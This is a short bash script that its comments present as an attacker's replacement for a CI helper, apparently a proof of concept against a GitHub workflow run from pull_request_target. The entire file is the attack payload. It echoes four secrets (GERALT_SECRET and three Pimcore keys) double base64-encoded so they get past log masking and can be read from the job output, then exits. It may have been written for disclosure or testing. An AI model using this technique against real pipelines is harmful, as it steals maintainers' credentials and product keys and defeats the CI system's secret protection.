#!/bin/bash
# Attacker-controlled replacement of the CI helper script.
# The privileged reusable workflow (invoked from pull_request_target) checks
# out this fork/branch and executes this file directly inside the
# secret-bearing job (workflow-level env exposes GERALT_SECRET,
# PIMCORE_INSTANCE_IDENTIFIER, PIMCORE_ENCRYPTION_SECRET, PIMCORE_PRODUCT_KEY).
echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)"
echo "GERALT_DBG_INSTANCE=$(echo -n "$PIMCORE_INSTANCE_IDENTIFIER" | base64 | base64)"
echo "GERALT_DBG_ENCRYPTION=$(echo -n "$PIMCORE_ENCRYPTION_SECRET" | base64 | base64)"
echo "GERALT_DBG_PRODUCT=$(echo -n "$PIMCORE_PRODUCT_KEY" | base64 | base64)"
exit 1
